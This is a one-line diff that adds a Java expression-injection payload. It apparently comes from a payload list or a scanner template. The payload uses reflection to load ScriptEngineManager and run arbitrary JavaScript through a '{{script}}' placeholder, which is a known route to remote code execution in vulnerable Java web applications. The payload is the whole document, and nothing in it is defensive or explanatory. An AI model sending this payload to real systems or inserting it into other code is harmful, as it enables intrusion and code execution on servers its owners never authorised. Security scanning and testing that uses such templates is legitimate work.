@@ -1,0 +1,1 @@
+"".getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('{{script}}')
